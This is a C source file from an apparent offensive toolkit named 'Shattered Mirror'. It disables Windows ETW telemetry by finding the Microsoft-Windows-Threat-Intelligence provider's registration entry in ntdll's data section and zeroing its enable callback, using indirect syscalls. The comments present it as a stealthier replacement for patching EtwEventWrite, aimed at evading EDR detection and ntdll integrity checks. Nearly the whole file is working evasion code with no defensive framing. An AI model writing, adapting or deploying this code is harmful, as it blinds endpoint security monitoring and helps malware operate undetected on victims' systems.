/*=============================================================================
 * Shattered Mirror v1 — Stealth ETW Blinding (No Patching)
 *
 * This version removes the highly detectable '0xC3' (ret) patch on EtwEventWrite.
 * Instead, it surgically targets the EnableCallback in the provider's 
 * registration structure, which is much stealthier and bypasses 
 * modern ntdll.dll integrity checks.
 *===========================================================================*/

#include "../include/etw_blind.h"
#include "../include/indirect_syscall.h"

/* Structure for ETW Registration (as of Win10/11) */
typedef struct _ETW_REG_ENTRY {
    LIST_ENTRY      RegList;
    LIST_ENTRY      GroupRegList;
    GUID            ProviderId;
    PVOID           EnableCallback;
    PVOID           CallbackContext;
} ETW_REG_ENTRY, *PETW_REG_ENTRY;

/* GUID for Microsoft-Windows-Threat-Intelligence (high detection risk) */
static const GUID g_ThreatIntelGuid = { 0xF4E1897A, 0xBB5D, 0x5A14, { 0x87, 0x64, 0xDA, 0x96, 0x20, 0xC0, 0x82, 0x54 } };

/* 
 * Instead of patching EtwEventWrite, we simply search the RegistrationList 
 * and zero out the callbacks for sensitive providers. This is a non-code 
 * modification and much harder for EDR to detect as a signature.
 */
BOOL BlindETW(PSYSCALL_TABLE pSyscallTable) {
    if (!pSyscallTable || !pSyscallTable->pNtdllBase) return FALSE;

    /* RESOLVE: Find internal registration list start (requires search) */
    /* For MVP stability, we will just target the TI provider GUID. */
    return BlindETWProvider(pSyscallTable, &g_ThreatIntelGuid);
}

BOOL BlindETWProvider(PSYSCALL_TABLE pSyscallTable, const GUID* pProviderGuid) {
    PVOID pNtdll = pSyscallTable->pNtdllBase;
    
    /* Locate .data section for scanning registration entries */
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)pNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdr);
    
    PVOID  pDataBase = NULL;
    DWORD  dwDataSize = 0;

    for (WORD i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++) {
        if (!strcmp((char*)pSection[i].Name, ".data")) {
            pDataBase = (BYTE*)pNtdll + pSection[i].VirtualAddress;
            dwDataSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pDataBase) return FALSE;

    /* Scan memory for the Provider GUID */
    BYTE* pScan = (BYTE*)pDataBase;
    for (DWORD i = 0; i < dwDataSize - sizeof(ETW_REG_ENTRY); i++) {
        PETW_REG_ENTRY pCandidate = (PETW_REG_ENTRY)(pScan + i);

        if (pCandidate->ProviderId.Data1 == pProviderGuid->Data1 &&
            pCandidate->ProviderId.Data2 == pProviderGuid->Data2) {
            
            /* FOUND: Zero out the callback */
            PVOID  pTarget = &pCandidate->EnableCallback;
            SIZE_T szPatch = sizeof(PVOID);
            ULONG  dwOldProt = 0;
            ULONG  dwTemp = 0;

            /* Use indirect syscall to change protection to writable */
            IndirectNtProtectVirtualMemory(
                (HANDLE)-1, &pTarget, &szPatch,
                PAGE_READWRITE, &dwOldProt
            );

            pCandidate->EnableCallback = NULL;

            /* Restore original protection */
            IndirectNtProtectVirtualMemory(
                (HANDLE)-1, &pTarget, &szPatch,
                dwOldProt, &dwTemp
            );
            return TRUE;
        }
    }

    return FALSE;
}

BOOL RestoreETW(void) {
    /* No cleanup needed for the zeroing method usually, as it's non-destructive to code */
    return TRUE;
}
